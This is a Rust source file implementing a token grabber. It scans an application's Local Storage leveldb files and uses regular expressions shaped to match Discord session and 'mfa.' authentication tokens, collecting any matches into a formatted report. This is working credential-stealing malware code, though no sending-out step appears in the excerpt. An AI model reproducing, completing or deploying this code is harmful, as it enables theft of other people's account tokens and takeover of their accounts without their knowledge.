use std::{fs::{self, File}, io::Read, path::Path};
use regex::Regex;

pub fn find_token(path: String) -> String {
    let mut result = String::new();
    result.push_str(format!("**Path: `{}`**\n", path.as_str()).as_str());
    let paths = fs::read_dir(format!("{}\\Local Storage\\leveldb", path)).unwrap();
    for path in paths {
        let f = path.unwrap().path().display().to_string();
        if !f.ends_with(".log") && !f.ends_with(".ldb") {
            continue;
        }
        let contents = file_read(f.clone());

        for i in contents.split("\n") {
            let re = Regex::new(r"mfa\.[a-zA-Z\--_]{84}").unwrap();
            match re.find(i) {
                Some(e) => result.push_str(format!("{}\n", e.as_str()).as_str()),
                None => (),
            }

            let re = Regex::new(r"[a-zA-Z\--_]{24}\.[a-zA-Z\--_]{6}\.[a-zA-Z\--_]{27}").unwrap();
            match re.find(i) {
                Some(e) => result.push_str(format!("{}\n", e.as_str()).as_str()),
                None => (),
            }
        }
    }
    result
}

fn file_read(mut file_name: String) -> String {
    file_name = file_name.replace("/", "");

    let path = Path::new(&file_name);
    if !path.exists() {
        return String::from("Not Found!").into();
    }
    let mut file_content = Vec::new();
    let mut file = File::open(&file_name).expect("Unable to open file");
    file.read_to_end(&mut file_content).expect("Unable to read");
    file_content
        .iter()
        .map(|x| String::from(*x as char))
        .collect::<String>()
}